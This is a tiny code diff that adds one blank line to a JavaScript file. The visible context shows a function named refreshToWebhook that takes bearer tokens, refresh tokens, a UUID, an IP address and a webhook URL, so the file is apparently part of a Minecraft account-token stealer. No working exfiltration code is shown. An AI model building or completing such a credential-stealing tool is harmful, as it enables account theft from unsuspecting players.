@@ -610,6 +610,7 @@ async function getRefreshData(refresh_token) {
 }
 
 
+
 async function refreshToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag, key, userToken) {
 	const networthArray = await getNetworth(username)
 	const networth = networthArray[0]
